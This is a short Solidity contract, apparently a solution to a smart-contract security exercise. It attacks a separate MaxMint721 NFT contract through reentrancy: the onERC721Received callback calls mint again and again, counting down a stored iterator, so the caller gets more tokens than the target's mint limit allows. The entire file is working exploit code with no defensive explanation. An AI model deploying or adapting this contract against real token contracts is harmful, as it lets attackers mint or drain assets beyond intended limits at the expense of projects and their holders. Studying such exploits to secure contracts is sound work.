// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.6;

import "./MaxMint721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SuperMint is IERC721Receiver {
  MaxMint721 implementation;
  uint maxMints;
  //added a new variable to perform the iteration and removed the bool variable
  uint iterator;


  constructor(address _implementation, uint _maxMints) {
    implementation = MaxMint721(_implementation);
    maxMints = _maxMints;
    //set the variable to max mint
    iterator = _maxMints;
  }

  function beginMint() external {
    implementation.mint(maxMints);
  }

  function onERC721Received(
    address,
    address,
    uint256,
    bytes memory
  ) public virtual override returns (bytes4) {
    //check if iterator is greater than 1 and then reduce it's value
    //before reentrance. When it's value drops below 1, reentrancy stops.
    if (iterator > 1) {
      iterator--;
      implementation.mint(iterator);
    }
    return this.onERC721Received.selector;
  }
}
